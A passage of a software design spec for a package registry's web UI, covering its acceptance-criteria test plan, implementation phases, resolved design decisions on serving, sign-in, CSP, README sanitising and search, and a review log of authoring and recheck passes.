| AC1 | integration + e2e + ci | `internal/ui/serve_test.go` (redirect, fallback including a directory path and `/ui/index.html`, no listing, cache headers, placeholder detection); `web/e2e/smoke.spec.ts` against the `make build` binary; `deploy/` image test in `deployment.md`'s packaging suite (its AC32); the `make verify` step in `scripts/verify-local.sh` (staged `index.html` versus `internal/ui/placeholder.html`, with a fixture repository in which a built page is staged) |
| AC2 | unit | `internal/format/register_test.go` (fixture handler named `ui`, root-anchored `/ui/x`, exactly `/`) |
| AC3 | integration + ci | `internal/ui/headers_test.go` (presence on `/ui/`, `/ui/auth/login`; absence on a fixture handler route and `/api/v1/`); `web/scripts/check-bundle.mjs` in `make verify` (inline script, handlers, styles, `data:` assets) |
| AC4 | e2e + integration | `web/e2e/signin.spec.ts` (OIDC stand-in, `return_to` accepted and rejected, a callback without the pre-authentication cookie, local admin through the SPA form with its flow token, the form post without a token, with another flow's token and replayed, `POST` logout, `GET` logout inert); `internal/auth/session_test.go` |
| AC5 | e2e | `web/e2e/browse.spec.ts`, table-driven over every registered format's seeded fixture, with a slash-bearing and a reserved-character coordinate for each format whose grammar admits them; `web/src/lib/routes.test.ts` |
| AC6 | e2e | `web/e2e/search.spec.ts` (two principals plus anonymous) |
| AC7 | e2e + unit | `web/e2e/setup.spec.ts` (page text versus API body); `internal/surface/render_test.go` |
| AC8 | e2e | `web/e2e/charter-ac11.spec.ts` (create remote, copy snippet, run in the client container, assert install) |
| AC9 | e2e | `web/e2e/delete.spec.ts` (name typed, identity sent, recreate race, `in-use`, detach) |
| AC10 | e2e | `web/e2e/lifecycle.spec.ts` (freeze, thaw, rename, unsupported rename; refresh now as `POST .../refresh` under `push`, hidden from a `pull`-only principal, the `refresh` operation listed) |
| AC11 | e2e | `web/e2e/pointers.spec.ts` (injected clock for the out-of-window pin) |
| AC12 | e2e | `web/e2e/credentials.spec.ts` (the row `credential-management.md` AC23 names, plus the public-key section against its AC12) |
| AC13 | e2e + integration | `web/e2e/csrf.spec.ts` (header injection; cross-site post; a planted `stackweaver_csrf` cookie with a matching header); `internal/auth/session_test.go` |
| AC14 | e2e | `web/e2e/grants.spec.ts` (three principals; forged request) |
| AC15 | e2e | `web/e2e/existence-oracle.spec.ts` (DOM and request-sequence equality) |
| AC16 | unit + e2e | `web/src/components/Problem.test.tsx`; `web/e2e/errors.spec.ts` |
| AC17 | unit + integration | `internal/surface/declaration_test.go` over the registry (unknown variable, bare variable in a `file` step in every spelling the template grammar admits, a `file` path that is absolute, `~`-prefixed or traverses, unknown hint kind); `internal/surface/render_test.go` (the metacharacter table per step kind); `conformance/core/case_validate_test.go` (undeclared id; unexercised recipe; shared with `conformance-harness.md` AC26) |
| AC18 | e2e | `web/e2e/supply-chain.spec.ts` (verdicts, refusals after purge, trust keys); `web/e2e/operations.spec.ts` (three principals: originating, admin, third; forged cancel) |
| AC19 | unit + e2e | `web/src/lib/markdown.test.ts`; `web/src/lib/links.test.ts` (scheme table over hint, verdict and advisory values); `web/e2e/readme.spec.ts` with a CSP violation listener |
| AC20 | e2e | `@axe-core/playwright` fixture in every spec; `web/e2e/keyboard.spec.ts` |
| AC21 | ci | `web/scripts/check-bundle.mjs` in `make verify` |
| AC22 | e2e | `web/e2e/perf.spec.ts` (seeded through the `seed` subcommand) |
| AC23 | architecture test + e2e | `internal/ui/arch_test.go`; `web/e2e/network-audit.ts` fixture |
| AC24 | ci | `make verify` regeneration diff of `web/src/api/schema.d.ts`; `tsc --noEmit` |
| AC25 | e2e | `web/e2e/storage.spec.ts` (admin and non-admin) |
| AC26 | unit + e2e | `internal/ui/config_test.go` (defaults; no disabling key); `web/e2e/header.spec.ts` (name, title, help-link position across every page) |
| AC27 | e2e | `web/e2e/jobs.spec.ts` (admin and non-admin; cancel a pending job; pause a kind, enqueue, resume; the network audit proves the non-admin sent nothing) |
| AC28 | e2e | `web/e2e/grants.spec.ts` (shared with AC14: the principal listing, create, the granted session, revoke); `web/e2e/upstream-credentials.spec.ts` (create, no readable value, rotate, `in-use`) |
| AC29 | e2e | `web/e2e/replication.spec.ts` against two instances provisioned through `conformance-harness.md`'s `replication` setup entry (link create, sync, re-seed with confirmation, takeover with acknowledgement and the signing-key `conflict`, delete; no export or import control) |

## Implementation Phases

### Phase 1: Serving, sign-in and the harness (charter step 9 entry)
- `web/` scaffold: Vite, TypeScript, React, React Aria Components, the design tokens, the
  message catalogue, `make web`, `make verify` hooks (AC21, AC24)
- `internal/ui`: embed, SPA fallback, root redirect, headers, placeholder, arch test (AC1, AC2, AC3, AC23)
- Browser sign-in routes with `internal/auth`, session and CSRF in the client (AC4, AC13)
- Playwright harness: compose of binary, PostgreSQL, object store, OIDC stand-in; the network
  audit and axe fixtures; the existence-oracle spec (AC15, AC20 fixture)

### Phase 2: Browsing, search and the surface declaration
- `internal/surface`: declaration types, renderer, registration through `surface.Declarer`,
  the recipes read; `surface.yaml` for every Tier 1 format (AC7, AC17)
- Harness `client.recipe` and the two validator rules (AC17)
- Repositories, search, repository, package, version and setup pages; markdown sanitiser; the
  problem renderer (AC5, AC6, AC16, AC19)

### Phase 3: Administration
- Create repository, settings (the policy document included), freeze, thaw, rename with
  `unbound_hosts`, delete with identity confirmation, virtual members, upstream binding, refresh
  now (AC9, AC10, AC14)
- Pointers and the pinned-storage view (AC11, AC25)
- The admin's Jobs page (AC27)

### Phase 4: Credentials, grants and the supply chain views
- Tokens, registered public keys and robots (AC12); grants and upstream credentials (AC28)
- Trust, keys and fingerprints, verdicts, refusals, operations with cancel (AC18)

### Phase 5: The charter flow and the gates
- `charter-ac11.spec.ts` with the real client container (AC8)
- Keyboard traversal, dark scheme axe pass, perf budgets, browser matrix on the main-gated job
  (AC20, AC22)

### Phase 6: Replication (with `replication.md`, charter step 10)
- The Replication tab and its spec against two instances (AC29); lands when the link routes do,
  after the five phases above

## Tasks

Left empty by `/spec`. Populated by `/tasks` once the spec reaches `planned`.

## Open Questions

None open. The nine questions this authoring pass raised are resolved below under the owner's
standing delegation, each reversible by the owner.

### Resolved: where the per-format recipes and display hints live (was Q1)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: an embedded
`surface.yaml` in the handler package, exposed through the optional `surface.Declarer` interface,
type-asserted at registration. Folded through Design ("The surface declaration"), AC7 and AC17;
`format-handler-interface.md` records the interface in its optional-interfaces table (resolved
optional-interfaces decision, was Q10) and `conformance-harness.md` carries the `recipe:` field
and the two validator rules (its AC26), both applied 2026-09-28.

The judgment call it settles: the hint requires snippets "generated from the same source as the
conformance client recipes, never hand-written per format", and the pinned method set is five.

**Recommendation (adopted):** A, because it keeps the pinned set at five (the precedent is
`management-api.md`'s optional operation interface), attributes the file to `format:<name>` by the
charter's path rule, and gives both consumers one parsed object.

| Option | You get | It costs |
|---|---|---|
| **A. Embedded `surface.yaml` per handler, optional `surface.Declarer`** | Pinned set unchanged; format cost line; one object for UI and runner | A handler can omit it, caught by AC17 rather than the compiler |
| **B. A field on `Capabilities()`** | No new interface | `Capabilities` becomes a grab bag beyond its two declared exemptions |
| **C. A shared directory of YAML under `internal/surface/formats/`** | One place to look | Every format's file charged to `shared:ui`, corrupting the per-format cost measurement |
| **D. Snippets written in `web/` per format** | Simplest today | Thirty-three untested documents; exactly what the hint forbids |

Accepted cost: registration must fail loudly on a missing or invalid declaration, since nothing
else will.

Rechecked on Fable 2026-10-01: confirmed. Two costs the record under-stated: a handler package
that implements `surface.Declarer` imports `internal/surface`'s value types, which
`format-handler-interface.md` AC15 now lists in its import allowlist for exactly this reason;
and a display hint names keys inside an opaque document the format may reshape, so a hint can
rot silently, which is why AC5 renders every hinted format's description, licence and homepage
from a seeded fixture on every run rather than trusting the declaration. The step kinds and the
quoting rule ("A step has a kind") are a fold this recheck added, not a change to the decision.

### Resolved: the component library (was Q2)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: React Aria Components for
interactive primitives, plain CSS with tokens for everything else. Folded through Design ("The
stack") and the accessibility table.

**Recommendation (adopted):** A, because the accessibility criteria are met or missed inside
dialogs, menus, comboboxes and tables, and a library built to the ARIA Authoring Practices carries
that behaviour into every page rather than every page re-deriving it.

| Option | You get | It costs |
|---|---|---|
| **A. React Aria Components plus own CSS** | Accessible widget behaviour by default; no styling opinion imposed | One dependency to track; its widgets styled from scratch |
| **B. A styled component kit (MUI, Chakra)** | Faster first screens | Runtime CSS injection conflicts with the no-inline-style CSP; a visual identity that is theirs |
| **C. Hand-rolled widgets** | No dependency | Every ARIA pattern re-implemented and re-tested; the historical source of most a11y defects |

Accepted cost: the dependency's release cadence becomes ours to follow.

Rechecked on Fable 2026-10-01: confirmed. Two things the record did not say. The library
positions overlays through React's `style` prop, which lands through the CSSOM and not through
markup, so it is compatible with `style-src 'self'` and no `'unsafe-inline'`; that is now stated
under "Security headers" and held by the CSP violation listener every spec installs, because a
widget library that needed inline styles would have made this option and the CSP decision
mutually exclusive. And the library is large enough that AC21's 250 KB initial-route budget is
met only with per-route code splitting and per-component imports, which "The stack" requires;
the budget check is what keeps that true.

### Resolved: the browser matrix (was Q3)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: Chromium on every run;
Chromium, Firefox and WebKit on the main-gated job that already runs conformance. Folded through
Scope (out of scope) and Design ("Testing strategy").

**Recommendation (adopted):** A, because the constitution's CI economy rule makes per-run minutes a
budget and the main-gated job is where the long suites already live; an engine-specific defect is
still caught before a release, on `main`.

| Option | You get | It costs |
|---|---|---|
| **A. Chromium per run; three engines on the main-gated job** | Fast pull-request feedback; full coverage before release | A Firefox-only defect surfaces after merge, like a conformance defect does today |
| **B. Three engines on every run** | Earliest detection | Triple e2e minutes on every push |
| **C. Chromium only** | Cheapest | WebKit (Safari) never tested; a real share of operators use it |

Rechecked on Fable 2026-10-01: confirmed. Under-stated cost: Playwright's WebKit on a Linux
runner is the WebKit engine and not Safari, so a Safari-only defect (its cookie partitioning,
its `SameSite` handling, its storage limits) still escapes the matrix; the matrix catches
engine defects, not browser defects, and the record now says so. The main-gated job also grows
by two more e2e runs, on top of the conformance minutes it already spends.

### Resolved: what an anonymous visitor sees (was Q4)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: the UI works unauthenticated
and shows what visibility allows; sign-in is offered, never required, until an action needs a
grant. Folded through Design ("Authentication in the browser", the page inventory) and AC6.

**Recommendation (adopted):** A, because visibility is `auth.md`'s repository setting evaluated by
the API, and a sign-in wall would be a policy that exists only in the UI, which this spec forbids
on principle; a registry that wants nothing public sets no repository public.

| Option | You get | It costs |
|---|---|---|
| **A. Anonymous browsing of public repositories** | One policy (visibility), decided by the API | A public registry's package pages are crawlable, as npm's and PyPI's are |
| **B. Sign-in wall** | Nothing rendered before identity | A UI-only rule; anonymous `pull` still works for clients, so the wall protects nothing |

Rechecked on Fable 2026-10-01: confirmed, with the cost stated more honestly. "What visibility
allows" is everything `pull` reads on a public repository, which is more than package pages:
the pointer set, the trust set, every policy refusal with its advisory, and the operations
listing with the display name of every principal who ran one. The UI renders what the API
returns and hides none of it, so a public repository's operator activity is world-readable
through this page exactly as it is through `curl`; that is `management-api.md`'s disclosure to
state or narrow (reported), and this record names it so the choice is not mistaken for an
oversight here. The anonymous `GET /api/v1/session` answer (`200`, `principal_kind:
anonymous`) is the fold that makes the first paint branch-free, and it holds.

### Resolved: how deletion is confirmed in the browser (was Q5)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: the admin types the
repository name; the client sends the identity it loaded. Folded through the page inventory and
AC9.

**Recommendation (adopted):** A, because `repository-lifecycle.md` AC19 wants the identity in the
request to close the delete-and-recreate race, and the identity the page loaded does exactly that
without asking a human to transcribe an opaque id; typing the name is the deliberate-intent check.

| Option | You get | It costs |
|---|---|---|
| **A. Type the name, send the loaded identity** | Race closed by the API; intent proven by typing | A stale page refused with `validation`, rendered as the problem |
| **B. Type the identity** | Nothing hidden | Transcribing `rep_...` is friction without safety, since the page shows it anyway |
| **C. A checkbox** | Fastest | GitHub, Harbor and Gitea all moved off this for destructive actions; an accidental delete is the failure the lifecycle spec priced highest |

Rechecked on Fable 2026-10-01: confirmed. The fold was extended on this pass rather than the
decision: the dialog now carries `reclaim: now` as an opt-in the admin must set (the API's
default is the slow path, `repository-lifecycle.md`), AC9 asserts it is sent only when chosen,
and the same identity-confirmation dialog is reused by the replication re-seed, so one
destructive-action pattern serves both.

### Resolved: cross-format search (was Q6)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: a server-side
`GET /api/v1/search` over package names, scoped to what the caller may read, with an index over
`Package.name` and no new entity. Folded through the page inventory and AC6; `management-api.md`
carries the route in its endpoint table (its AC28) and `data-model.md` the index (its AC42, "The
search index"), both applied 2026-09-28.

**Recommendation (adopted):** A, because a client-side search would have to list every repository
the caller may read on every keystroke, which is slow and, at the edge of the existence oracle,
dangerous; the API already authorizes listings per repository, so a search is a listing with a
predicate.

| Option | You get | It costs |
|---|---|---|
| **A. Server-side search route, indexed name match** | One authorized query; fast; oracle-safe | A new read route and an index |
| **B. Client-side filter over listings** | No API change | Unbounded fan-out; existence-oracle risk in the client |
| **C. Full-text over metadata documents** | Richer results | A search engine dependency for a question nobody asked yet |

Rechecked on Fable 2026-10-01: confirmed. One precision the record lacked: `management-api.md`
AC28 groups the response by repository, and the page regroups by format from the format each
repository carries, adding no request ("The existence oracle in a browser"), so the grouping
this page shows is a client rendering and never a second query. The accepted cost stands: the
match is over `Package.name` only, so a README phrase or a Maven group id finds nothing, and a
richer search is a `data-model.md` change, not a UI one.

### Resolved: rendering package READMEs (was Q7)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: client-side rendering
through an allowlist sanitiser, raw HTML dropped, remote images as links, with the CSP as the
second wall. Folded through Design ("Security headers"), AC19 and the display hints.

**Recommendation (adopted):** A, because `puppet.md` placed rendering with the UI ("a presentation
concern the UI owns"), server-side rendering is the second authorization path Scope rejects, and
plain text throws away the one document users read most.

| Option | You get | It costs |
|---|---|---|
| **A. Client-side, sanitised, no remote images** | Readable READMEs; no server render path; no tracking | Images authors embedded appear as links |
| **B. Server-side render** | Cacheable HTML | A template path beside the API; XSS surface on the server |
| **C. Plain text** | No sanitiser | The most-read document unreadable |

Rechecked on Fable 2026-10-01: confirmed, fold amended. The authoring fold had three holes an
attacker-authored README would have walked through, each closed in "Security headers": the
sanitiser was described over the Markdown source, where raw HTML blocks pass a Markdown
allowlist untouched, and it now walks the rendered tree parsed into an inert document; the CSP
allowed `img-src data:` for Vite's inlined assets, which would have admitted a `data:` image an
author embedded, and it now allows `'self'` only with `build.assetsInlineLimit: 0`; and only
README links were called untrusted, while a `homepage` hint, a verdict identity and an advisory
reference reach an `href` by other paths, so one helper (`web/src/lib/links.ts`) is now the only
path from any document value to an anchor, with `react/no-danger` keeping the sanitised
component the one HTML injection site. AC19 asserts each. The decision (client-side, sanitised,
no remote images) is unchanged.

### Resolved: how the binary builds without the web toolchain (was Q8)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: a committed placeholder
`index.html` in `internal/ui/dist`, overwritten by `make web`, with every release path building the
frontend first. Folded through Design ("Serving and mounting") and AC1.

**Recommendation (adopted):** A, because `go build` and `go test ./...` must work on a checkout
without Node for the Go-only agent sessions the charter's cost ledger separates, while a build tag
would produce two binaries with different route tables and let the flag-less one ship.

| Option | You get | It costs |
|---|---|---|
| **A. Committed placeholder, overwritten at build** | One binary shape; Go tooling works alone | A dev build can serve the placeholder; AC1 makes the release paths immune |
| **B. Build tag `ui`** | No placeholder | Two binaries; a release built without the tag is silently UI-less |
| **C. Commit the built assets** | Always present | Megabytes of generated files in every diff; the source of truth duplicated |

Rechecked on Fable 2026-10-01: confirmed, fold amended. The accepted cost said "a dev build
can serve the placeholder" and stopped there; the sharper cost is that `make web` overwrites a
tracked file, so a developer who builds and then stages everything commits a built page over
the placeholder, and option C arrives by accident. Two mechanics now hold the line ("Serving
and mounting"): `.gitignore` keeps every build output but `index.html` untracked, and a `make
verify` step compares the staged `index.html` with `internal/ui/placeholder.html`, so a built
working tree stays green and a built commit does not (AC1). The decision is unchanged.

### Resolved: where the browser sign-in routes mount (was Q9)

**Adopted 2026-09-27 under the owner's standing delegation.** Option A: `/ui/auth/login`,
`/ui/auth/callback` and `/ui/auth/logout`, mounted by `internal/auth` under the reserved `ui`
segment. Folded through Design ("Position", "Authentication in the browser"); `auth.md` names the
three routes and their mounting in "The two surfaces" (applied 2026-09-27).

**Recommendation (adopted):** A, because the whole browser surface then sits under one reserved
segment, the code stays with the spec that owns the flow, and `/api/v1` keeps its contract of
JSON in and JSON out (a redirect-driven flow does not belong in an OpenAPI document).

| Option | You get | It costs |
|---|---|---|
| **A. Under `/ui/auth/`, mounted by `internal/auth`** | One reserved segment for the browser; API stays pure JSON | `auth.md` names paths under a segment it does not own |
| **B. A second reserved segment `auth`** | Ownership aligned | Another reserved string; the OCI token endpoint already lives elsewhere, so `auth` would be a misnomer |
| **C. Under `/api/v1/auth/`** | One mount | Redirect flows inside the OpenAPI contract; CSRF and cookie semantics leaking into the API's conventions |

Rechecked on Fable 2026-10-01: confirmed, fold amended. The mount is right; the routes' shape
was under-specified in four ways that the recheck fixed in "Position" and "Authentication in
the browser": the methods (`GET` and `POST` on login, `POST` only on logout, since a `GET`
logout is a state change on `GET`); the binding of `state`, `nonce` and the PKCE verifier to
the browser that started the flow through a pre-authentication cookie, without which a callback
is a login-CSRF vector; the `return_to` grammar, without which the callback is an open redirect;
and the local admin form, which the authoring fold had `internal/auth` rendering as HTML on a
route outside the SPA's CSP and axe coverage, and which is now a page of the SPA posting a
server-issued flow token. The cost "`auth.md` names paths under a segment it does not own" is
joined by a second: `auth.md`'s "The two surfaces" now describes the login route as rendering
the form, which this pass reports as a wording consequence rather than silently diverging from.

## Review Log

| Date | HEAD sha | Reviewer lens | Outcome |
|------|----------|---------------|---------|
| 2026-09-27 | b98090c | authoring pass: grounded first draft, not a review | Not a review. Gathered the requirements `project-charter.md` (AC11, step 9, its resolved web-UI-criterion decision), `management-api.md`, `credential-management.md` (AC23), `auth.md` (AC2, AC14, AC17, AC22), `repository-lifecycle.md` (AC19), `artifact-verification.md` (AC27), `signing-service.md`, `supply-chain-policy.md` (AC5), `observability.md`, `async-operations.md`, `proxy-cache.md`, `storage-and-gc.md` (AC19), `deployment.md`, `conformance-harness.md`, `format-handler-interface.md` (AC11) and fourteen format specs placed on the web UI; grounded prior art in Gitea, Nexus, pulp-ui, Harbor and WCAG 2.2 by fetch this run (Artifactory's portal returned no text; no claim made). Fixed the embedded serving under a reserved `ui` segment with a strict CSP, the pure-API-client posture with its network audit and architecture test, the surface declaration feeding both the setup page and the conformance runner, the page inventory, the WCAG 2.2 AA table and the Playwright strategy. Nine questions adopted under the standing delegation; zero open; 26 criteria, each with a Test Plan row. Sibling consequences reported to the loop for `management-api.md`, `auth.md`, `format-handler-interface.md`, `conformance-harness.md`, `supply-chain-policy.md`, `deployment.md`, `project-charter.md`, `data-model.md` and `repository-lifecycle.md`. Claim verification vacuous pre-code: no `web/`, no `internal/` exists at b98090c. |
| 2026-09-28 | ff7966e | cross-spec reconciliation of the foundation authoring wave. Not a review | Not a review. Every item in `agents/spec-loop/consequences.md` targeting this file verified against the source spec's current text before applying. `management-api.md` reconciliation item 2: the Repositories page and AC25 read the deleted listing as `GET /api/v1/repositories?state=deleted` (its resolved deleted-listing decision, was Q11); "refresh now" is `POST /api/v1/repositories/{name}/refresh` under `push` in the Repository row, AC10 and its Test Plan row (its AC29); `GET /api/v1/session` answers an anonymous caller `200` with `principal_kind: anonymous` (its AC28). `conformance-harness.md` reconciliation item 8: the two validator rules cite its AC26 in Design, AC17, its Test Plan row and the enforcer table. `replication.md` reconciliation item 5: "replication's segment" is `replication`. `format-handler-interface.md` reconciliation item 5: `surface.Declarer` cites its optional-interfaces table (was Q10); exactly `/` is recorded reserved there. `data-model.md` reconciliation item 9: the resolved search decision cites AC42. Every "sibling consequence" phrase rewritten as a citation of the applied text (auth.md "The two surfaces" and AC22, management-api AC30 for the session on `/api/v1`, the charter's frontend line). Added the `ui.instance_name` and `ui.help_url` key table in the three-column shape for `scripts/check-config-keys.js`, and the `deployment.md` row now names its "The web UI build" and AC32. "Two non-API routes" corrected to three. No em-dashes or en-dashes. `node scripts/check-spec.js`: zero failures for this file. Stays `draft`. |
| 2026-10-01 | 13192da | Fable recheck: full review (claim verification at HEAD of every sibling citation: `management-api.md`'s endpoint table, AC18, AC23 as amended, AC28, AC29, AC30, AC34 and its kind table; `auth.md` "The two surfaces", the echo-route bound "a session cookie is not a form on a format route", AC2, AC14, AC17, AC22; `credential-management.md` AC12, AC18, AC23; `async-operations.md` AC5, AC10, AC21 and the kind-state record; `replication.md` AC16, AC19; `repository-lifecycle.md` AC19, AC28; `supply-chain-policy.md` AC5, AC25; `storage-and-gc.md` AC19; `observability.md`'s catalogue row, AC14 and its audit vocabulary; `deployment.md` AC32 and its `ui.` row; `conformance-harness.md` AC26 and its `replication` key; `format-handler-interface.md` AC11, AC15 and its reserved and optional-interface tables; `data-model.md` AC39, AC42; `project-charter.md` AC11, step 9; the tree at 13192da: no `web/`, no tracked `internal/` file, no `deploy/`, a two-suite `scripts/verify-local.sh`, no `/opt/pw-browsers` on this host) + adversarial lens at full strength on the cloud-authored whole + constitution + go-spec-reviewer inline + re-examination of the nine adoptions made without Fable | Resumed from an interrupted pass whose uncommitted edits (the dependency rows, the Jobs page, the Replication tab, registered keys, the policy document, the step kinds, the DOM-walking sanitiser, the no-`data:` CSP, the links helper, the placeholder mechanics, the session-bound CSRF compare, `format="ui"`, AC27 to AC29) were each judged and kept, with one corrected: the local admin form carried "the pre-authentication cookie's token as its hidden field", which an HttpOnly cookie makes unreadable, so the token now travels in the `302` to `/ui/signin?flow=` and the form is a native post checked against the flow the cookie names, single-use; the authoring fold's `GET /api/v1/session` addition is withdrawn, since the server decides between provider and form and the SPA need not know. Brought current first: observability recheck item 7 applied ("Observed as `ui`"); every earlier item against this file verified applied at ff7966e. Verdicts: Q1, Q2, Q3, Q4, Q5, Q6 confirmed with under-stated costs added to each record; Q7, Q8, Q9 confirmed with their folds amended (records say what changed). None superseded. Found and fixed beyond the adoptions: the stdlib file server lists a directory and redirects `index.html`, so the fallback checks the embedded tree first (AC1 row); a `file` step's `path` was unconstrained (AC17); the bare-variable rule had no mechanism, now the parsed tree; a session reaching a handler document link on a private repository is anonymous there, so the link is offered on public repositories only; coordinates with slashes (OCI, npm scopes, generic paths) are one encoded route segment (AC5, a new enforcer); AC14 still named an audit page; the testing strategy still named `/opt/pw-browsers`; AC27 names the kind the suite pauses; "writes no audit line" narrowed to static reads, since the vocabulary registers no session event (reported). go-spec-reviewer inline: stdlib serving (`embed`, `fs.Sub`, `http.FileServerFS`), a one-method consumer-declared interface, registration-time failure for every declaration defect, one justified third-party dependency (the YAML parser), typed `ui.Config`; approved after the fixes. Constitution: both paths (AC8's proxied install, AC5's hosted browsing), the shared model (the search index and the principal listing are `data-model.md`'s, no table here), no handler owns a table (`surface.yaml` is data), a named enforcer per boundary (twelve), CI economy (Chromium per run), findings in the doc; nothing weakens `auth.md` AC10. No em-dashes on touched lines. 29 criteria, each with a Test Plan row; Open Questions empty; `node scripts/check-spec.js`: zero failures on this file. Sibling consequences reported to the orchestrator, not applied: `auth.md` (the two-surfaces wording, the flow token, the session-bound CSRF compare in AC22, a session audit event), `management-api.md` (AC30's compare wording, `GET /api/v1/principals`, the operations listing's disclosure under `pull`), `observability.md` (session events), `conformance-harness.md` (the single-recipe runner entry), `deployment.md` (`make web-clean`, the `.gitignore` rule, the staged-placeholder step), `question-triage.md`. `fable_recheck` cleared; draft to planned. |
